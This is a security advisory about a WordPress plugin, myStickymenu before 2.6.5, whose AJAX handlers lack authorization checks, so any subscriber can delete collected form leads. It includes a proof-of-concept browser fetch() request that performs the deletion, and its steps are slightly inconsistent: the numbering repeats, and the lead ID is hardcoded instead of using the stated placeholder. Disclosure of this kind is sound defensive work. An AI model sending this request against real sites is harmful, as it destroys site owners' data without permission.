## WordPress Plugin Vulnerabilities

# myStickymenu < 2.6.5 - Subscriber+ Arbitrary Form Leads Deletion

### Description

The plugin does not adequately authorize some ajax calls, allowing any logged-in user to perform the actions.

### Proof of Concept

1. Visit myStickymenu > + Create new Welcome Bar. Ensure "Collect leads" is enabled, enable the toggle at the top, and Save.
2. In a logged-out window, fill the lead form in the sticky bar. As an admin, confirm that a lead has been generated, and take note of the ID.
3. Log in as a subscriber and visit the frontend. Run the following code, replacing LEAD\_ID with the ID of the generated lead from the previous step.
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": 'action=my\_sticky\_menu\_bulks&bulks[]=3&wpnonce=' + welcomebar\_frontjs.ajax\_nonce,
"method": "POST",
"mode": "cors",
"credentials": "include"
});
3. See that the lead has been deleted.
